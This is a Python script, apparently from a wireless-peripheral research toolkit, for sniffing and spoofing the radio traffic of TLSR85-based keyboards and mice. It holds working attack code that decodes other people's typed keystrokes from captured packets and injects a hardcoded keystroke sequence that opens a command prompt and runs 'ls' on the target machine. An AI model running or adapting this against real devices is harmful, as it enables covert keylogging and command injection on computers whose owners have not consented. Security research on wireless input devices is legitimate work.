#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Dummy spoofer for TLSR85 based devices
# Address of keyboard is hardcoded

import time

from binascii import unhexlify
from lib import common
from devices.TLSR85.tlsr85 import Tlsr85
from devices.TLSR85.tlsr85_keyboard import *
from devices.TLSR85.tlsr85_mouse import *
from devices.TX.tx_mouse import Tx_mouse


common.init_args('./tlsr85-spoofing.py')
common.parse_and_init()


def spoof(attack, address, preamble, channels, rate):
    channel_index = 0
    common.radio.set_channel(channels[channel_index]) # Set channel here to prevent USBError (somehow)
    common.radio.enter_promiscuous_mode_generic(address, rate=rate)
    for payload in attack:
        if callable(payload):
            payload() # in case we want a delay
        else:
            for i in range(len(channels)):
                common.radio.set_channel(channels[i])
                for _ in range(20):
                    common.radio.transmit_payload_generic(payload=preamble+payload, address=address)
                    time.sleep(0.0001)


def sniff(keyboard, mouse):
    dwell = 200
    dwell_time = dwell / 1000

    channels = keyboard.CHANNELS
    byte_base_address = unhexlify(keyboard.base_address.replace(':', ''))
    byte_keyboard_address = unhexlify(keyboard.keyboard_address.replace(':', ''))
    byte_mouse_address = unhexlify(mouse.mouse_address.replace(':', ''))

    channel_index = 0
    common.radio.set_channel(channels[channel_index]) # Set channel here to prevent USBError (somehow)
    common.radio.enter_promiscuous_mode_generic(unhexlify(keyboard.base_address.replace(':', '')), rate=keyboard.RATE)

    entered_string = ""
    last_tune = time.time()


    while True:
        # Increment the channel after dwell_time
        if len(channels) > 1 and time.time() - last_tune > dwell_time:
            channel_index = (channel_index + 1) % (len(channels))
            common.radio.set_channel(channels[channel_index])
            last_tune = time.time()

        value = common.radio.receive_payload()
        if len(value) >= keyboard.BASE_ADDRESS_LENGTH:
            found_base_address = bytes(value[:keyboard.BASE_ADDRESS_LENGTH])
            if found_base_address == byte_base_address:    
                found_specific_address = bytes(value[keyboard.BASE_ADDRESS_LENGTH:keyboard.FULL_ADDRESS_LENGTH])

                if found_specific_address == byte_keyboard_address and len(value) >= keyboard.packet_size:
                    packet = keyboard.parse_packet(bytes(value))
                    if keyboard.check_crc(packet["crc"], packet["payload"]):
                        # print(f"Keyboard packet\tCHANNEL:{channels[channel_index]}")
                        # print(packet)
                        entered_string += keyboard.scancode_to_char(packet["array"], packet["raw_modifiers"])
                        print(entered_string)
                        last_tune = time.time()
                
                elif found_specific_address == byte_mouse_address:
                    packet = mouse.parse_packet(bytes(value))
                    if mouse.check_crc(packet["crc"], packet["payload"]):
                        print(f"Mouse packet\tCHANNEL : {channels[channel_index]}")
                        print(packet)
                        last_tune = time.time() 


trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", "aa:aa:b5", 22, 0x11021, 0x24bf, 2)
# poss_keyboard = Tlsr85Keyboard("d5:54:cb", "80", "aa:aa:cc", 22, 0x11021, 0xcb01, 2)


attack = [
    trust_keyboard.build_packet(modifiers=[Tlsr85KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_C]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_M]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_D]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_L]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_S]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER])
    ]



address = unhexlify(trust_keyboard.base_address.replace(':', ''))
preamble = unhexlify(trust_keyboard.preamble.replace(':', ''))


# spoof(attack, address, preamble, trust_keyboard.CHANNELS, trust_keyboard.RATE)

# trust_mouse = Tlsr85Mouse("4a:b4:cb", "dc", "aa:aa:aa:b5", 30, 0x11021, 0x24bf, 2)
# sniff(trust_keyboard, trust_mouse)

tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)
tx_mouse.sniff()